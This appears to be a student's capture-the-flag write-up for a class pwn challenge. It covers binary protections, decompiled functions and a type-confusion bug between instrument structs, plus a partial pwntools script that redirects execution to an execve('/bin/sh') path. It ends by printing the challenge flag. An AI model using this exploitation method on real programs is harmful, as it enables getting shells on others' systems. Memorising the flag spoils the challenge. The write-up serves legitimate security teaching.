# Bin1:Solution

This binary was modeled after the [type](https://github.com/kourtnee/VR_HW/tree/main/type) challenge from class. 

The binary is compiled with NX, a stack canary and Full RELRO 
```
checksec chal.bin 
[*] '/root/workspace/vuln/midterm/ctfd/ash/chal.bin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

There isn't a 'win' function, however a quick search shows us that /bin/sh is in the binary. 
```
rabin2 -zz chal.bin| grep bin
74  0x00002dce 0x00402dce 7   8    .rodata   ascii   /bin/sh
75  0x00002dd6 0x00402dd6 12  13   .rodata   ascii   /usr/bin/cat
```

Looking for strings in binja:
```
004015ae  int64_t sub_401116(int32_t arg1)

004015b9      void* fsbase
004015b9      int64_t rax = *(fsbase + 0x28)
004015cc      if (arg1 != 1)
00401635          exit(status: 1)
00401635          noreturn
004015d5      void* const var_28 = "/bin/sh"
004015d9      int64_t var_20 = 0
004015f4      execve("/bin/sh", &var_28, 0, &var_28)
00401619      syscall(0x3b, "/usr/bin/cat", &var_28, 0)
00401623      int64_t rax_4 = rax - *(fsbase + 0x28)
0040162c      if (rax == *(fsbase + 0x28))
00401640          return rax_4
0040163a      __stack_chk_fail()
0040163a      noreturn
```

This function calls /bin/sh with execve. So getting here should work to get a shell.

There are a few functions that are important to note, but are sort of irrelevant in the event you never looked at them.

secure    
secure_b    
secure_c    

The main one to consider is:
```
004017e3  int64_t secure(int32_t arg1)

004017ee      void* fsbase
004017ee      int64_t rax = *(fsbase + 0x28)
00401802      int64_t rax_2 = seccomp_init(0x7fff0000)
00401826      seccomp_rule_add(rax_2, 0, 0x3b, 0)
00401846      seccomp_rule_add(rax_2, 0, 1, 0)
00401850      sub_401116(1)
00401870      seccomp_rule_add(rax_2, 0, 0, 0)
00401890      seccomp_rule_add(rax_2, 0x7fff0000, 0x7b, 0)
00401899      if (arg1 != 1)
004018a2          seccomp_release(rax_2)
004018ac      int64_t rax_13 = rax - *(fsbase + 0x28)
004018b5      if (rax == *(fsbase + 0x28))
004018bd          return rax_13
004018b7      __stack_chk_fail()
004018b7      noreturn
```

This function adds seccomp rules, however 0x3b is execve so it's one of the ones allowed by the rules. 

From here most of the exploit developed previously remains the same. The space for guitar is still 16 and the drum is still 32. The difference in size combined with the fact that they are both using the same input for either option makes it possible to use type confusion to exploit the binary.

Using this we can borrow a drum and use it to store values and then mimic the guitar. The display_guitar function checks to see if it's a guitar using the value 31337.

Since the space we need to fill is the same as before, I decided to leave the /bin/sh\0 that previously needed to be written as-is. 

Then instead of a system call, we call secure. Above the function sub_401116 is called inside the secure function, that just so happens to be the function that contains the execve call with /bin/sh.

```
# make it guitar
chain += p64(0x31337)

# call secure
chain += p64(e.sym['secure'])

p.sendline(chain)

# read until end of menu
p.recvuntil(b'>>> ')

# select display name
p.sendline(b'4')

# select instrument 1
p.sendline(b'0')

p.interactive()
```

Sending the exploit got the flag!
```
flag{second_star_t0_th3_right}
```

Thanks Peter Pan.   

Resources:
* Previous challenge from class
* Louie and Ash (both because they helped me with the original and because they both let it slip that the binary was just like the challenge but without access to system)
* Louie also talked about how it was weird that the 'secure' function fell through somehow to the execve call since they weren't next to each other in memory, and that's how I figured out that the 'secure' function called sub_401116.
